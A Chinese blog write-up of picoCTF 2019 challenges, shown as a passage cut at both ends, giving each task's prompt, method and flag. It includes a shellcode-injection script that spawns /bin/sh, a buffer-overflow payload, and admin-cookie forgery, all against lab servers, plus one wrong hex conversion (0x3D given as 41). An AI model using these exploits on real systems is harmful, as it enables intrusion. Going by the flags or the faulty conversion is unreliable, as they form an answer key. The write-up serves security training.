<p>There appear to be some mysterious glyphs hidden inside this abandoned factory… I wonder what would happen if you collected them all?</p>
</blockquote>
<blockquote>
<p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘hello’, you would submit ‘picoCTF{hello}’ as the flag.</p>
</blockquote>
<p>游戏题,需要做完所有题目才能通关</p>
<h2 id="2Warm-Points-50"><a href="#2Warm-Points-50" class="headerlink" title="2Warm - Points: 50"></a>2Warm - Points: 50</h2><blockquote>
<p>Can you convert the number 42 (base 10) to binary (base 2)?</p>
</blockquote>
<blockquote>
<p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘11111’, you would submit ‘picoCTF{11111}’ as the flag.</p>
</blockquote>
<p>42–&gt;101010</p>
<p>picoCTF{101010}</p>
<h2 id="Lets-Warm-Up-Points-50"><a href="#Lets-Warm-Up-Points-50" class="headerlink" title="Lets Warm Up - Points: 50"></a>Lets Warm Up - Points: 50</h2><blockquote>
<p>If I told you a word started with 0x70 in hexadecimal, what would it start with in ASCII?</p>
</blockquote>
<blockquote>
<p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘hello’, you would submit ‘picoCTF{hello}’ as the flag.</p>
</blockquote>
<p>0x70–&gt;p</p>
<p>picoCTF{p}</p>
<h2 id="Warmed-Up-Points-50"><a href="#Warmed-Up-Points-50" class="headerlink" title="Warmed Up - Points: 50"></a>Warmed Up - Points: 50</h2><blockquote>
<p>What is 0x3D (base 16) in decimal (base 10).</p>
</blockquote>
<blockquote>
<p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘22’, you would submit ‘picoCTF{22}’ as the flag.</p>
</blockquote>
<p>0x3D–&gt;41</p>
<p>picoCTF{41}</p>
<h2 id="Bases-Points-100"><a href="#Bases-Points-100" class="headerlink" title="Bases - Points: 100"></a>Bases - Points: 100</h2><blockquote>
<p>What does this bDNhcm5fdGgzX3IwcDM1 mean? I think it has something to do with bases.</p>
</blockquote>
<blockquote>
<p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘hello’, you would submit ‘picoCTF{hello}’ as the flag.</p>
</blockquote>
<p>base64解密</p>
<p>picoCTF{l3arn_th3_r0p35}</p>
<h2 id="First-Grep-Points-100"><a href="#First-Grep-Points-100" class="headerlink" title="First Grep - Points: 100"></a>First Grep - Points: 100</h2><blockquote>
<p>Can you find the flag in file? This would be really tedious to look through manually, something tells me there is a better way. You can also find the file in /problems/first-grep_6_c2319e8af66fa6bec197edc733dd52dd on the shell server.</p>
</blockquote>
<blockquote>
<p>Hints: grep <a href="https://ryanstutorials.net/linuxtutorial/grep.php" target="_blank" rel="noopener">tutorial</a></p>
</blockquote>
<p>拖进winhex里,搜索字符</p>
<figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{grep_is_good_to_find_things_cdb327ab}</p>
<h2 id="Resources-Points-100"><a href="#Resources-Points-100" class="headerlink" title="Resources - Points: 100"></a>Resources - Points: 100</h2><blockquote>
<p>We put together a bunch of resources to help you out on our website! If you go over there, you might even find a flag! <a href="https://picoctf.com/resources" target="_blank" rel="noopener">https://picoctf.com/resources</a> (link)</p>
</blockquote>
<figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{r3source_pag3_f1ag}</p>
<h2 id="strings-it-Points-100"><a href="#strings-it-Points-100" class="headerlink" title="strings it - Points: 100"></a>strings it - Points: 100</h2><blockquote>
<p>Can you find the flag in file without running it? You can also find the file in /problems/strings-it_5_1fd17da9526a76a4fffce289dee10fbb on the shell server.</p>
</blockquote>
<blockquote>
<p>Hints: <a href="https://linux.die.net/man/1/strings" target="_blank" rel="noopener">strings</a><br>执行strins命令,查找flag</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings strings | grep picoCTF</span><br></pre></td></tr></table></figure>
<p>picoCTF{5tRIng5_1T_dd38f284}</p>
<h2 id="what’s-a-net-cat-Points-100"><a href="#what’s-a-net-cat-Points-100" class="headerlink" title="what’s a net cat? - Points: 100"></a>what’s a net cat? - Points: 100</h2><blockquote>
<p>Using netcat (nc) is going to be pretty important. Can you connect to 2019shell1.picoctf.com at port 21865 to get the flag?</p>
</blockquote>
<blockquote>
<p>Hints: nc <a href="https://linux.die.net/man/1/nc" target="_blank" rel="noopener">tutorial</a></p>
</blockquote>
<figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{nEtCat_Mast3ry_4fefb685}</p>
<h2 id="Based-Points-200"><a href="#Based-Points-200" class="headerlink" title="Based - Points: 200"></a>Based - Points: 200</h2><blockquote>
<p>To get truly 1337, you must understand different data encodings, such as hexadecimal or binary. Can you get the flag from this program to prove you are on the way to becoming 1337? Connect with nc 2019shell1.picoctf.com 29594.</p>
</blockquote>
<blockquote>
<p>Hints: I hear python can convert things.<br>  It might help to have multiple windows open</p>
</blockquote>
<p>简单的进制转换,嫌麻烦不想写脚本的话网上都有在线转换</p>
<figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{learning_about_converting_values_e67b1990}</p>
<h2 id="First-Grep-Part-II-Points-200"><a href="#First-Grep-Part-II-Points-200" class="headerlink" title="First Grep: Part II - Points: 200"></a>First Grep: Part II - Points: 200</h2><blockquote>
<p>Can you find the flag in /problems/first-grep–part-ii_4_ca16fbcd16c92f0cb1e376a6c188d58f/files on the shell server? Remember to use grep.</p>
</blockquote>
<blockquote>
<p>Hints: grep <a href="https://ryanstutorials.net/linuxtutorial/grep.php" target="_blank" rel="noopener">tutorial</a></p>
</blockquote>
<p>使用命令,在当前目录下的多个文件中查找关键词</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">'picoCTF'</span> . -Rn</span><br></pre></td></tr></table></figure>
<p>得到输出<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./files6/file5:2:picoCTF&#123;grep_r_to_find_this_0e28f3ee&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="plumbing-Points-200"><a href="#plumbing-Points-200" class="headerlink" title="plumbing - Points: 200"></a>plumbing - Points: 200</h2><blockquote>
<p>Sometimes you need to handle process data outside of a file. Can you find a way to keep the output from this program and search for the flag? Connect to 2019shell1.picoctf.com 18944.</p>
</blockquote>
<blockquote>
<p>Hints: Remember the flag format is picoCTF{XXXX}<br>  What’s a pipe? No not that kind of pipe… This <a href="http://www.linfo.org/pipes.html" target="_blank" rel="noopener">kind</a></p>
</blockquote>
<p>输入命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 2019shell1.picoctf.com 18944 | grep picoCTF</span><br></pre></td></tr></table></figure>
<p>picoCTF{digital_plumb3r_1d5b7de7}</p>
<h2 id="where-is-the-file-Points-200"><a href="#where-is-the-file-Points-200" class="headerlink" title="where-is-the-file - Points: 200"></a>where-is-the-file - Points: 200</h2><blockquote>
<p>I’ve used a super secret mind trick to hide this file. Maybe something lies in /problems/where-is-the-file_6_8eae99761e71a8a21d3b82ac6cf2a7d0.</p>
</blockquote>
<blockquote>
<p>Hints: What command can see/read files?<br>  What’s in the manual page of ls?</p>
</blockquote>
<figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>ls -a 参数能查看隐藏文件</p>
<p>picoCTF{w3ll_that_d1dnt_w0RK_a88d16e4}</p>
<h1 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h1><h2 id="handy-shellcode-Points-50"><a href="#handy-shellcode-Points-50" class="headerlink" title="handy-shellcode - Points: 50"></a>handy-shellcode - Points: 50</h2><blockquote>
<p>This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_0_24753fd2c78ac1a60682f0c924b23405 on the shell server. Source.</p>
</blockquote>
<blockquote>
<p>Hints: You might be able to find some good shellcode online.</p>
</blockquote>
<p>在比赛的shell里输入exp</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">'vuln'</span>)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">'\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>picoCTF{h4ndY_d4ndY_sh311c0d3_ce07e7f1}</p>
<h2 id="practice-run-1-Points-50"><a href="#practice-run-1-Points-50" class="headerlink" title="practice-run-1 - Points: 50"></a>practice-run-1 - Points: 50</h2><blockquote>
<p>You’re going to need to know how to run programs if you’re going to get out of here. Navigate to /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e on the shell server and run this program to receive a flag.</p>
</blockquote>
<blockquote>
<p>Hints: How do you execute a program in a command line?</p>
</blockquote>
<figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{g3t_r3adY_2_r3v3r53}</p>
<h2 id="OverFlow-0-Points-100"><a href="#OverFlow-0-Points-100" class="headerlink" title="OverFlow 0 - Points: 100"></a>OverFlow 0 - Points: 100</h2><blockquote>
<p>This should be easy. Overflow the correct buffer in this program and get a flag. Its also found in /problems/overflow-0_6_1279241c50d050a1045301d7970f2fe3 on the shell server. Source.</p>
</blockquote>
<blockquote>
<p>Hints: Find a way to trigger the flag to print<br>  If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren’t expecting.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> flag[FLAGSIZE_MAX];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigsegv_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, flag);</span><br><span class="line">  fflush(<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *input)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  FILE *f = fopen(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag,FLAGSIZE_MAX,f);</span><br><span class="line">  signal(SIGSEGV, sigsegv_handler);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    vuln(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You entered: %s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please enter an argument next time\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>传入的参数没有限制大小造成在vuln函数里面strcpy至buf时可能导致栈溢出,可以从0x804a080开始覆盖<br>执行exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">'./vuln'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./vuln'</span>)</span><br><span class="line">flag_addr = <span class="number">0x804a080</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">buf = <span class="string">'a'</span>*<span class="number">0x90</span></span><br><span class="line">payload  = buf + <span class="string">'aaaa'</span></span><br><span class="line">payload += p32(puts_plt) + <span class="string">'aaaa'</span> + p32(flag_addr)</span><br><span class="line">p = process(argv=[<span class="string">'./vuln'</span>, payload])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./7.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{3asY_P3a5yd4a28467}</p>
<h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="The-Numbers-Points-50"><a href="#The-Numbers-Points-50" class="headerlink" title="The Numbers - Points: 50"></a>The Numbers - Points: 50</h2><blockquote>
<p>The numbers… what do they mean?</p>
</blockquote>
<blockquote>
<p>Hints: The flag is in the format PICOCTF{}</p>
</blockquote>
<p>16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14}</p>
<p>对应字母表A-Z</p>
<p>PICOCTF{THENUMBERSMASON}</p>
<h2 id="13-Points-100"><a href="#13-Points-100" class="headerlink" title="13 - Points: 100"></a>13 - Points: 100</h2><blockquote>
<p>Cryptography can be easy, do you know what ROT13 is? cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}</p>
</blockquote>
<blockquote>
<p>Hints: This can be solved online if you don’t want to do it by hand!</p>
</blockquote>
<p>解凯撒密码</p>
<figure class="image-box">
                <img src="./8.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{not_too_bad_of_a_problem}</p>
<h2 id="Easy1-Points-100"><a href="#Easy1-Points-100" class="headerlink" title="Easy1 - Points: 100"></a>Easy1 - Points: 100</h2><blockquote>
<p>The one time pad can be cryptographically secure, but not when you know the key. Can you solve this? We’ve given you the encrypted flag, key, and a table to help UFJKXQZQUNB with the key of SOLVECRYPTO. Can you use this table to solve it?.</p>
</blockquote>
<blockquote>
<p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘hello’, you would submit ‘picoCTF{HELLO}’ as the flag.<br>  Please use all caps for the message.</p>
</blockquote>
<p>维吉尼亚密码解密</p>
<figure class="image-box">
                <img src="./9.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{CRYPTOISFUN}</p>
<h2 id="caesar-Points-100"><a href="#caesar-Points-100" class="headerlink" title="caesar - Points: 100"></a>caesar - Points: 100</h2><blockquote>
<p>Decrypt this message. You can find the ciphertext in /problems/caesar_4_33e5994add902b2321c8c38c8b962eff on the shell server.</p>
</blockquote>
<blockquote>
<p>Hints: caesar cipher tutorial</p>
</blockquote>
<p>在线解凯撒密码,整出一个看上去挺正常的</p>
<figure class="image-box">
                <img src="./10.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{crossingtherubiconljmawiae}</p>
<h2 id="Flags-Points-200"><a href="#Flags-Points-200" class="headerlink" title="Flags - Points: 200"></a>Flags - Points: 200</h2><blockquote>
<p>What do the flags mean?</p>
</blockquote>
<blockquote>
<p>Hints: The flag is in the format PICOCTF{}</p>
</blockquote>
<figure class="image-box">
                <img src="./11.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>国际海事信号旗图标+数字旗号</p>
<p>PICOCTF{F1AG5AND5TUFF}</p>
<h2 id="Tapping-Points-200"><a href="#Tapping-Points-200" class="headerlink" title="Tapping - Points: 200"></a>Tapping - Points: 200</h2><blockquote>
<p>Theres tapping coming in from the wires. What’s it saying nc 2019shell1.picoctf.com 37911.</p>
</blockquote>
<blockquote>
<p>Hints: What kind of encoding uses dashes and dots?<br>  The flag is in the format PICOCTF{}</p>
</blockquote>
<p>nc过去后是摩斯密码,脚本解一下</p>
<figure class="image-box">
                <img src="./12.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>PICOCTF{M0RS3C0D31SFUN2265937663}</p>
<h2 id="la-cifra-de-Points-200"><a href="#la-cifra-de-Points-200" class="headerlink" title="la cifra de - Points: 200"></a>la cifra de - Points: 200</h2><blockquote>
<p>I found this cipher in an old book. Can you figure out what it says? Connect with nc 2019shell1.picoctf.com 39776.</p>
</blockquote>
<blockquote>
<p>Hints: There are tools that make this easy.<br>  Perhaps looking at history will help</p>
</blockquote>
<p>1402Vigenère密码</p>
<p>学长给的破解网站  <a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">https://www.guballa.de/vigenere-solver</a></p>
<p>picoCTF{b311a50_0r_v1gn3r3_c1ph3r1119c336}</p>
<h2 id="waves-over-lambda-Points-300"><a href="#waves-over-lambda-Points-300" class="headerlink" title="waves over lambda - Points: 300"></a>waves over lambda - Points: 300</h2><blockquote>
<p>We made alot of substitutions to encrypt this. Can you decrypt it? Connect with nc 2019shell1.picoctf.com 32282.</p>
</blockquote>
<blockquote>
<p>Hints: Flag is not in the usual flag format</p>
</blockquote>
<p>破解网址  <a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a></p>
<p>用statistics模式</p>
<p>picoCTF{frequency_is_c_over_lambda_ptthttobuc}</p>
<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="Glory-of-the-Garden-Points-50"><a href="#Glory-of-the-Garden-Points-50" class="headerlink" title="Glory of the Garden - Points: 50"></a>Glory of the Garden - Points: 50</h2><blockquote>
<p>This garden contains more than it seems. You can also find the file in /problems/glory-of-the-garden_0_25ece79ae00914856938a4b19d0e31af on the shell server.</p>
</blockquote>
<blockquote>
<p>Hints: What is a hex editor?</p>
</blockquote>
<p>下载是张图片,拖进notepad里,结尾发现flag</p>
<figure class="image-box">
                <img src="./13.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{more_than_m33ts_the_3y3f089EdF0}</p>
<h2 id="unzip-Points-50"><a href="#unzip-Points-50" class="headerlink" title="unzip - Points: 50"></a>unzip - Points: 50</h2><blockquote>
<p>Can you unzip this file and get the flag?</p>
</blockquote>
<blockquote>
<p>Hints: put the flag in the format picoCTF{XXXXX}</p>
</blockquote>
<p>我想多了!!flag就是图片上的文字</p>
<p>picoCTF{unz1pp1ng_1s_3a5y}</p>
<h2 id="So-Meta-Points-150"><a href="#So-Meta-Points-150" class="headerlink" title="So Meta - Points: 150"></a>So Meta - Points: 150</h2><blockquote>
<p>Find the flag in this picture. You can also find the file in /problems/so-meta_0_7c0b2ae7a38b024c6b1c68cf50970a88.</p>
</blockquote>
<blockquote>
<p>Hints: What does meta mean in the context of files?<br>  Ever hear of metadata?</p>
</blockquote>
<p>winhex打开,结尾发现flag</p>
<figure class="image-box">
                <img src="./14.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{s0_m3ta_dc38ce45}</p>
<h2 id="What-Lies-Within-Points-150"><a href="#What-Lies-Within-Points-150" class="headerlink" title="What Lies Within - Points: 150"></a>What Lies Within - Points: 150</h2><blockquote>
<p>Theres something in the building. Can you retrieve the flag?</p>
</blockquote>
<blockquote>
<p>Hints: There is data encoded somewhere, there might be an online decoder</p>
</blockquote>
<p>拖进stegsolve里提取最低位</p>
<figure class="image-box">
                <img src="./15.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{h1d1ng_1n_th3_b1t5}</p>
<h2 id="extensions-Points-150"><a href="#extensions-Points-150" class="headerlink" title="extensions - Points: 150"></a>extensions - Points: 150</h2><blockquote>
<p>This is a really weird text file TXT? Can you find the flag?</p>
</blockquote>
<blockquote>
<p>Hints: How do operating systems know what kind of file it is? (It’s not just the ending!<br>  Make sure to submit the flag as picoCTF{XXXXX}</p>
</blockquote>
<p>打开txt看到png头,改后缀为png</p>
<figure class="image-box">
                <img src="./16.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{now_you_know_about_extensions}</p>
<h2 id="shark-on-wire-1-Points-150"><a href="#shark-on-wire-1-Points-150" class="headerlink" title="shark on wire 1 - Points: 150"></a>shark on wire 1 - Points: 150</h2><blockquote>
<p>We found this packet capture. Recover the flag. You can also find the file in /problems/shark-on-wire-1_0_13d709ec13952807e477ba1b5404e620.</p>
</blockquote>
<blockquote>
<p>Hints: Try using a tool like Wireshark<br>  What are streams?</p>
</blockquote>
<p>根据hint追踪UDP流,得到flag</p>
<figure class="image-box">
                <img src="./17.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{StaT31355_636f6e6e}</p>
<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><h2 id="vault-door-training-Points-50"><a href="#vault-door-training-Points-50" class="headerlink" title="vault-door-training - Points: 50"></a>vault-door-training - Points: 50</h2><blockquote>
<p>Your mission is to enter Dr. Evil’s laboratory and retrieve the blueprints for his Doomsday Project. The laboratory is protected by a series of locked vault doors. Each door is controlled by a computer and requires a password to open. Unfortunately, our undercover agents have not been able to obtain the secret passwords for the vault doors, but one of our junior agents obtained the source code for each vault’s computer! You will need to read the source code for each level to figure out what the password is for that vault door. As a warmup, we have created a replica vault in our training facility. The source code for the training vault is here: VaultDoorTraining.java</p>
</blockquote>
<blockquote>
<p>Hints: The password is revealed in the program’s source code.</p>
</blockquote>
<figure class="image-box">
                <img src="./18.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>查看源码,得到flag   picoCTF{w4rm1ng_Up_w1tH_jAv4_fcb79c48f5b}</p>
<h2 id="vault-door-1-Points-100"><a href="#vault-door-1-Points-100" class="headerlink" title="vault-door-1 - Points: 100"></a>vault-door-1 - Points: 100</h2><blockquote>
<p>This vault uses some complicated arrays! I hope you can make sense of it, special agent. The source code for this vault is here: VaultDoor1.java</p>
</blockquote>
<blockquote>
<p>Hints: Look up the charAt() method online.</p>
</blockquote>
<p>按照 charAt() 方法顺序读出flag</p>
<p>picoCTF{d35cr4mbl3_tH3_cH4r4cT3r5_63ef3a}</p>
<h1 id="WEB应用"><a href="#WEB应用" class="headerlink" title="WEB应用"></a>WEB应用</h1><h2 id="Insp3ct0r-Points-50"><a href="#Insp3ct0r-Points-50" class="headerlink" title="Insp3ct0r - Points: 50"></a>Insp3ct0r - Points: 50</h2><blockquote>
<p>Kishor Balan tipped us off that the following code may need inspection: <a href="https://2019shell1.picoctf.com/problem/9509/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/9509/</a> (link) or <a href="http://2019shell1.picoctf.com:9509" target="_blank" rel="noopener">http://2019shell1.picoctf.com:9509</a></p>
</blockquote>
<blockquote>
<p>Hints: How do you inspect web code on a browser?<br>  There’s 3 parts</p>
</blockquote>
<p>进页面后,分别在html,css,js代码里找到三个部分的flag</p>
<figure class="image-box">
                <img src="./19.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <img src="./20.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <img src="./21.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?8a7e3144}</p>
<h2 id="dont-use-client-side-Points-100"><a href="#dont-use-client-side-Points-100" class="headerlink" title="dont-use-client-side - Points: 100"></a>dont-use-client-side - Points: 100</h2><blockquote>
<p>Can you break into this super secure portal? <a href="https://2019shell1.picoctf.com/problem/49886/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/49886/</a> (link) or <a href="http://2019shell1.picoctf.com:49886" target="_blank" rel="noopener">http://2019shell1.picoctf.com:49886</a></p>
</blockquote>
<blockquote>
<p>Hints: Never trust the client</p>
</blockquote>
<p>调console看到js代码里的flag片段,flag可以由意思猜出来</p>
<figure class="image-box">
                <img src="./22.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{no_clients_plz_ee2f24}</p>
<h2 id="logon-Points-100"><a href="#logon-Points-100" class="headerlink" title="logon - Points: 100"></a>logon - Points: 100</h2><blockquote>
<p>The factory is hiding things from all of its users. Can you login as logon and find what they’ve been looking at? <a href="https://2019shell1.picoctf.com/problem/47307/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/47307/</a> (link) or <a href="http://2019shell1.picoctf.com:47307" target="_blank" rel="noopener">http://2019shell1.picoctf.com:47307</a></p>
</blockquote>
<blockquote>
<p>Hints: Hmm it doesn’t seem to check anyone’s password, except for ‘s?</p>
</blockquote>
<p>试了几个用户登进去都没有flag,后来F12进后台看cookie有admin=Flase,改成True就行</p>
<figure class="image-box">
                <img src="./23.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{th3_c0nsp1r4cy_l1v3s_95e4b2d5}</p>
<h2 id="where-are-the-robots-Points-100"><a href="#where-are-the-robots-Points-100" class="headerlink" title="where are the robots - Points: 100"></a>where are the robots - Points: 100</h2><blockquote>
<p>Can you find the robots? <a href="https://2019shell1.picoctf.com/problem/47235/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/47235/</a> (link) or <a href="http://2019shell1.picoctf.com:47235" target="_blank" rel="noopener">http://2019shell1.picoctf.com:47235</a></p>
</blockquote>
<blockquote>
<p>Hints: What part of the website could tell you where the creator doesn’t want you to look?</p>
</blockquote>
<p>查看robots.txt文件</p>
<figure class="image-box">
                <img src="./24.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <img src="./25.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{ca1cu1at1ng_Mach1n3s_54e98}</p>
<h2 id="Client-side-again-Points-200"><a href="#Client-side-again-Points-200" class="headerlink" title="Client-side-again - Points: 200"></a>Client-side-again - Points: 200</h2><blockquote>
<p>Can you break into this super secure portal? <a href="https://2019shell1.picoctf.com/problem/47277/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/47277/</a> (link) or <a href="http://2019shell1.picoctf.com:47277" target="_blank" rel="noopener">http://2019shell1.picoctf.com:47277</a></p>
</blockquote>
<blockquote>
<p>Hints: What is obfuscation?</p>
</blockquote>
<figure class="image-box">
                <img src="./26.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>混淆还是能猜出来是啥的  </p>
<p>picoCTF{not_this_again_d29871}</p>
<h2 id="Open-to-admins-Points-200"><a href="#Open-to-admins-Points-200" class="headerlink" title="Open-to-admins - Points: 200"></a>Open-to-admins - Points: 200</h2><blockquote>
<p>This secure website allows users to access the flag only if they are admin and if the time is exactly 1400. <a href="https://2019shell1.picoctf.com/problem/45127/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/45127/</a> (link) or <a href="http://2019shell1.picoctf.com:45127" target="_blank" rel="noopener">http://2019shell1.picoctf.com:45127</a></p>
</blockquote>
<blockquote>
<p>Hints: Can cookies help you to get the flag?</p>
</blockquote>
<p>同上一题,在cookie里添加两个变量</p>
<p>admin=True,time=1400,得到flag</p>
<figure class="image-box">
                <img src="./27.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{0p3n_t0_adm1n5_42e59862}</p>
<h2 id="picobrowser-Points-200"><a href="#picobrowser-Points-200" class="headerlink" title="picobrowser - Points: 200"></a>picobrowser - Points: 200</h2><blockquote>
